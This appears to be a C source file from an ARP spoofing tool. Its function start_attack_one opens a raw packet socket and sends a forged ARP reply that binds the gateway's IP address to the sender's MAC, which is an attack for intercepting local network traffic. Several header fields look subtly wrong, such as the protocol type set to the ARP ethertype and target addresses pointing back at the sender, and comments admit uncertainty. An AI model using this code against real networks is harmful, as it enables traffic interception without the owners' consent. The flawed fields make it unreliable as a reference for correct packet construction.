#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netdb.h>
#include <linux/if_arp.h>

# include "struct.h"
# include "define.h"
# include "utils.h"

static SOCKET initiate_socket_for_arp(const char ifacename[IFNAMSIZ])
{
	SOCKET iface = 0;

	iface = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (iface == -1)
		goto err;
	if (setsockopt(iface, SOL_SOCKET, SO_BINDTODEVICE, ifacename, strlen(ifacename)) == -1)
		goto err;

	return iface;
err:
	if (iface > 0) {
		close(iface);
		ERROR_SOCKET_MODIFY_DENIED(ifacename);
	}
	else
		ERROR_SOCKET_DENIED();
	return(-1);	
}


int start_attack_one(const struct arguments *arguments, nmap_r *target)
{
	unsigned char payload[42] = { 0x0 };
	SOCKET iface = -1;
	eth *eth_hdr = (eth*)payload;
	arp *arp_hdr = (arp*)(payload + ETH_HLEN);
	struct sockaddr_ll ifaceinfo = { 0x0 };
	socklen_t ifaceinfolen;
	size_t rlen;

	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;

	copy_mac(eth_hdr->dest_addr, target->ha);	/* 6 bytes dest addr */
	copy_mac(eth_hdr->src_addr, arguments->self_ha);	/* 6 bytes src addr (us) */
	eth_hdr->eth_type = htons(ETH_P_ARP);	/* arp request htons(0x0806) */
	arp_hdr->htype = 0x1;	/* hardware type htons(0x1) */ // not sure about this
	arp_hdr->ptype = htons(ETH_P_ARP);	/* protocol type htons(0x0806) */ // nor this
	arp_hdr->hlen = ETH_ALEN; /* hardware addr len 6 */
	arp_hdr->plen = IPV4_LEN; /* proto addr len 4 */
	arp_hdr->operation = htons(0x2);	/* response arp type */
	copy_mac(arp_hdr->sender_ha, arguments->self_ha);	/* mac to spoof */
	copy_ipv4(arp_hdr->sender_pa, arguments->gateway_pa);	/* ip to spoof */
	copy_mac(arp_hdr->target_ha, arguments->self_ha);	/* mac origin of the response (us) */
	copy_ipv4(arp_hdr->target_pa, arguments->self_pa);	/* ip origin of the response (us) */

	ifaceinfo.sll_family = AF_PACKET;
	ifaceinfo.sll_protocol = htons(ETH_P_ARP);
	ifaceinfo.sll_ifindex = if_nametoindex(arguments->ifacename); // ???????????
	ifaceinfo.sll_hatype = htons(ARPHRD_ETHER);
	ifaceinfo.sll_pkttype = (0);
	ifaceinfo.sll_halen = ETH_ALEN;
	ifaceinfo.sll_addr[6] = 0x00;
	ifaceinfo.sll_addr[7] = 0x00;

	// while (g_stop != 1) {

		rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));

		if (rlen != ETH_HLEN + ARP_HLEN)
			{ ERROR_SEND(); goto err; }

	// }

	close(iface);
	return 0;
err:
	if (iface != -1)
		close(iface);
	return -1;
}
